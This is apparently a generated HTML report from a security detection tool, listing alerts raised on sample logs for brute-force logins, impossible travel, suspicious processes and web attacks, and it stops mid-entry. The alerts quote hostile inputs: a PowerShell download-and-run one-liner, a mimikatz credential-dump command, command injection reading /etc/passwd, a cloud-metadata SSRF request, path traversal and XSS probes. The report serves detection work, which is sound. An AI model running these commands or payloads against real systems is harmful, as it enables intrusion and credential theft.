@@ -1,0 +1,891 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PySOC Report — 2026-06-24T15:46:00+00:00</title>
+  <style>
+    :root {
+      --bg: #0f172a; --panel: #1e293b; --text: #e2e8f0; --muted: #94a3b8;
+      --accent: #38bdf8; --critical: #ef4444; --high: #f97316;
+      --medium: #eab308; --low: #22c55e; --info: #64748b;
+      --border: #334155;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; padding: 2rem; background: var(--bg); color: var(--text);
+           font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    h1 { margin: 0 0 0.25rem 0; font-size: 1.75rem; }
+    h2 { margin: 2rem 0 0.75rem 0; font-size: 1.25rem; color: var(--accent);
+         border-bottom: 1px solid var(--border); padding-bottom: 0.25rem; }
+    .muted { color: var(--muted); font-size: 0.85rem; }
+    .kpi-row { display: grid; grid-template-columns: repeat(5, 1fr); gap: 0.75rem; margin: 1rem 0 2rem 0; }
+    .kpi { background: var(--panel); border: 1px solid var(--border); border-radius: 8px;
+            padding: 1rem; text-align: center; }
+    .kpi .label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--muted); }
+    .kpi .value { font-size: 2rem; font-weight: 700; margin-top: 0.25rem; }
+    .kpi.critical .value { color: var(--critical); }
+    .kpi.high .value { color: var(--high); }
+    .kpi.medium .value { color: var(--medium); }
+    .kpi.low .value { color: var(--low); }
+    .kpi.info .value { color: var(--info); }
+    table { width: 100%; border-collapse: collapse; margin-bottom: 1.5rem;
+             background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+    th, td { padding: 0.6rem 0.8rem; text-align: left; border-bottom: 1px solid var(--border); }
+    th { background: #0b1220; color: var(--muted); font-weight: 600; font-size: 0.8rem;
+         text-transform: uppercase; letter-spacing: 0.05em; }
+    tr:last-child td { border-bottom: none; }
+    .card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px;
+             padding: 1rem 1.25rem; margin-bottom: 1rem; }
+    .card-header { display: flex; align-items: baseline; justify-content: space-between; gap: 1rem; }
+    .card-title { font-weight: 700; font-size: 1rem; margin: 0; }
+    .badge { display: inline-block; padding: 0.15rem 0.5rem; border-radius: 4px;
+              font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; }
+    .badge.critical { background: var(--critical); color: white; }
+    .badge.high { background: var(--high); color: white; }
+    .badge.medium { background: var(--medium); color: #1a1a1a; }
+    .badge.low { background: var(--low); color: #1a1a1a; }
+    .badge.info { background: var(--info); color: white; }
+    .card-meta { color: var(--muted); font-size: 0.8rem; margin: 0.5rem 0; }
+    .card-desc { margin: 0.5rem 0; }
+    pre { background: #0b1220; padding: 0.75rem; border-radius: 6px; overflow-x: auto;
+           font-size: 0.8rem; color: var(--text); border: 1px solid var(--border); }
+    .footer { margin-top: 2rem; padding-top: 1rem; border-top: 1px solid var(--border);
+              color: var(--muted); font-size: 0.8rem; }
+    a { color: var(--accent); }
+  </style>
+</head>
+<body>
+  <h1>PySOC Detection Report</h1>
+  <p class="muted">Generated 2026-06-24T15:46:00+00:00 · 31 alerts · 86 events analysed</p>
+
+  <div class="kpi-row">
+    <div class="kpi critical"><div class="label">Critical</div><div class="value">9</div></div>
+    <div class="kpi high"><div class="label">High</div><div class="value">17</div></div>
+    <div class="kpi medium"><div class="label">Medium</div><div class="value">5</div></div>
+    <div class="kpi low"><div class="label">Low</div><div class="value">0</div></div>
+    <div class="kpi info"><div class="label">Info</div><div class="value">0</div></div>
+  </div>
+
+  <h2>Alerts by Rule</h2>
+  <table>
+    <thead><tr><th>Rule ID</th><th>Rule Name</th><th>Count</th><th>Est. True-Positive Rate</th></tr></thead>
+    <tbody>
+      <tr><td><code>BF-001</code></td><td>Brute-force login (SSH/Windows)</td><td>3</td><td>0.85</td></tr>
+      <tr><td><code>IT-001</code></td><td>Impossible travel (anomalous geo-velocity)</td><td>1</td><td>0.7</td></tr>
+      <tr><td><code>SP-001</code></td><td>Suspicious process execution</td><td>3</td><td>0.95</td></tr>
+      <tr><td><code>WA-001</code></td><td>Web attack patterns (OWASP Top-10)</td><td>24</td><td>0.8</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Events by Source Type</h2>
+  <table>
+    <thead><tr><th>Source Type</th><th>Event Count</th></tr></thead>
+    <tbody>
+      <tr><td><code>apache</code></td><td>22</td></tr>
+      <tr><td><code>json</code></td><td>4</td></tr>
+      <tr><td><code>linux_auth</code></td><td>24</td></tr>
+      <tr><td><code>nginx</code></td><td>22</td></tr>
+      <tr><td><code>windows_json</code></td><td>14</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Alert Feed</h2>
+      <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>BF-001</code> Brute-force login (SSH/Windows)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:30:25+00:00 · source events: 6</p>
+      <p class="card-desc">6 failed logins for user &#x27;admin&#x27; from 203.0.113.6 within 25s</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.6&quot;,
+  &quot;user&quot;: &quot;admin&quot;,
+  &quot;failed_attempts&quot;: 6,
+  &quot;window_seconds&quot;: 600,
+  &quot;first_seen&quot;: &quot;2026-03-07T14:30:00+00:00&quot;,
+  &quot;last_seen&quot;: &quot;2026-03-07T14:30:25+00:00&quot;,
+  &quot;auth_methods&quot;: [
+    &quot;ssh2&quot;
+  ],
+  &quot;source_types&quot;: [
+    &quot;linux_auth&quot;
+  ],
+  &quot;note&quot;: &quot;Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>IT-001</code> Impossible travel (anomalous geo-velocity)</p>
+        <span class="badge medium">medium</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:30:00+00:00 · source events: 2</p>
+      <p class="card-desc">Impossible travel for user &#x27;alice&#x27;: login from US at 2026-03-07T14:00:00+00:00 then from CN at 2026-03-07T14:30:00+00:00 (11587 km in 0:30:00).</p>
+      <pre>{
+  &quot;user&quot;: &quot;alice&quot;,
+  &quot;from_country&quot;: &quot;US&quot;,
+  &quot;to_country&quot;: &quot;CN&quot;,
+  &quot;from_ip&quot;: &quot;1.2.3.4&quot;,
+  &quot;to_ip&quot;: &quot;5.6.7.8&quot;,
+  &quot;distance_km&quot;: 11586.9,
+  &quot;time_delta_seconds&quot;: 1800,
+  &quot;implied_speed_kmh&quot;: 23173.8,
+  &quot;max_speed_kmh&quot;: 900,
+  &quot;first_login_at&quot;: &quot;2026-03-07T14:00:00+00:00&quot;,
+  &quot;second_login_at&quot;: &quot;2026-03-07T14:30:00+00:00&quot;,
+  &quot;note&quot;: &quot;Possible false positives: corporate VPN that egresses through different POPs, mobile device switching between cell tower and Wi-Fi. Correlate with MFA challenge response.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>SP-001</code> Suspicious process execution</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:17:00+00:00 · source events: 1</p>
+      <p class="card-desc">Suspicious process execution detected: suspicious_parent_child:winword.exe-&gt;powershell.exe</p>
+      <pre>{
+  &quot;user&quot;: &quot;carol&quot;,
+  &quot;process_name&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
+  &quot;process_parent_name&quot;: &quot;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&quot;,
+  &quot;command_line&quot;: &quot;powershell.exe -nop -w hidden -c iex(iwr http://example.com/payload)&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;suspicious_parent_child:winword.exe-&gt;powershell.exe&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1204.002&quot;
+  ],
+  &quot;decoded_payload&quot;: null
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>SP-001</code> Suspicious process execution</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:16:00+00:00 · source events: 1</p>
+      <p class="card-desc">Suspicious process execution detected: mimikatz</p>
+      <pre>{
+  &quot;user&quot;: &quot;admin&quot;,
+  &quot;process_name&quot;: &quot;C:\\Temp\\mimikatz.exe&quot;,
+  &quot;process_parent_name&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
+  &quot;command_line&quot;: &quot;mimikatz.exe sekurlsa::logonpasswords exit&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;mimikatz&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1003.002&quot;
+  ],
+  &quot;decoded_payload&quot;: null
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>SP-001</code> Suspicious process execution</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:15:00+00:00 · source events: 1</p>
+      <p class="card-desc">Suspicious process execution detected: encoded_powershell</p>
+      <pre>{
+  &quot;user&quot;: &quot;admin&quot;,
+  &quot;process_name&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
+  &quot;process_parent_name&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+  &quot;command_line&quot;: &quot;powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAcAB5AHMAbwBjAC0AdABlAHMAdAA6ACAAaABhAHIAbQBsAGUAcwBzACAAZQBuAGMAbwBkAGUAZAAgAHAAYQB5AGwAbwBhAGQAJwA=&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;encoded_powershell&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.001&quot;
+  ],
+  &quot;decoded_payload&quot;: &quot;Write-Host &#x27;pysoc-test: harmless encoded payload&#x27;&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>BF-001</code> Brute-force login (SSH/Windows)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:12:24+00:00 · source events: 7</p>
+      <p class="card-desc">7 failed logins for user &#x27;Administrator&#x27; from 203.0.113.5 within 24s</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.5&quot;,
+  &quot;user&quot;: &quot;Administrator&quot;,
+  &quot;failed_attempts&quot;: 7,
+  &quot;window_seconds&quot;: 600,
+  &quot;first_seen&quot;: &quot;2026-03-07T14:12:00+00:00&quot;,
+  &quot;last_seen&quot;: &quot;2026-03-07T14:12:24+00:00&quot;,
+  &quot;auth_methods&quot;: [
+    &quot;windows_logon_type_3&quot;
+  ],
+  &quot;source_types&quot;: [
+    &quot;windows_json&quot;
+  ],
+  &quot;note&quot;: &quot;Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>BF-001</code> Brute-force login (SSH/Windows)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:10:49+00:00 · source events: 8</p>
+      <p class="card-desc">8 failed logins for user &#x27;root&#x27; from 203.0.113.5 within 49s</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.5&quot;,
+  &quot;user&quot;: &quot;root&quot;,
+  &quot;failed_attempts&quot;: 8,
+  &quot;window_seconds&quot;: 600,
+  &quot;first_seen&quot;: &quot;2026-03-07T14:10:00+00:00&quot;,
+  &quot;last_seen&quot;: &quot;2026-03-07T14:10:49+00:00&quot;,
+  &quot;auth_methods&quot;: [
+    &quot;ssh2&quot;
+  ],
+  &quot;source_types&quot;: [
+    &quot;linux_auth&quot;
+  ],
+  &quot;note&quot;: &quot;Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:09:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_etc_passwd, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/ping?host=8.8.8.8;cat /etc/passwd&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_etc_passwd&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:09:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_etc_passwd, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/ping?host=8.8.8.8;cat /etc/passwd&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_etc_passwd&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:08:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: ssrf_metadata, rfi_remote</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/fetch?url=http://169.254.169.254/latest/meta-data/&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;ssrf_metadata&quot;,
+    &quot;rfi_remote&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;rfi&quot;,
+    &quot;ssrf&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:08:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: ssrf_metadata, rfi_remote</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/fetch?url=http://169.254.169.254/latest/meta-data/&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;ssrf_metadata&quot;,
+    &quot;rfi_remote&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;rfi&quot;,
+    &quot;ssrf&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:07:10+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_etc_passwd</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/etc/passwd&quot;,
+  &quot;http_status_code&quot;: 404,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_etc_passwd&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:07:10+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_etc_passwd</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/etc/passwd&quot;,
+  &quot;http_status_code&quot;: 404,
+  &quot;http_user_agent&quot;: &quot;python-requests/2.31.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_etc_passwd&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:07:05+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_encoded</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;%2e%2e%2f%2e%2e%2fetc%2fpasswd&quot;,
+  &quot;http_status_code&quot;: 404,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_encoded&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:07:05+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_encoded</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;%2e%2e%2f%2e%2e%2fetc%2fpasswd&quot;,
+  &quot;http_status_code&quot;: 404,
+  &quot;http_user_agent&quot;: &quot;python-requests/2.31.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_encoded&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:07:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_dotdot, path_traversal_etc_passwd</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;../../../../etc/passwd&quot;,
+  &quot;http_status_code&quot;: 404,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_dotdot&quot;,
+    &quot;path_traversal_etc_passwd&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge critical">critical</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:07:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: path_traversal_dotdot, path_traversal_etc_passwd</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;198.51.100.42&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;../../../../etc/passwd&quot;,
+  &quot;http_status_code&quot;: 404,
+  &quot;http_user_agent&quot;: &quot;python-requests/2.31.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;path_traversal_dotdot&quot;,
+    &quot;path_traversal_etc_passwd&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1083&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;path&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:06:08+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: xss_js_uri, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=javascript:alert(1)&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;xss_js_uri&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1059.007&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;xss&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:06:08+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: xss_js_uri, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=javascript:alert(1)&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;xss_js_uri&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1059.007&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;xss&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:06:04+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: xss_event_handler, xss_img_tag, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=&lt;img src=x onerror=alert(1)&gt;&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;xss_event_handler&quot;,
+    &quot;xss_img_tag&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1059.007&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;xss&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:06:04+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: xss_event_handler, xss_img_tag</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=&lt;img src=x onerror=alert(1)&gt;&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;xss_event_handler&quot;,
+    &quot;xss_img_tag&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.007&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;xss&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:06:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: xss_script_tag, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=&lt;script&gt;alert(1)&lt;/script&gt;&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;xss_script_tag&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1059.007&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;xss&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:06:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: xss_script_tag, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=&lt;script&gt;alert(1)&lt;/script&gt;&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15&quot;,
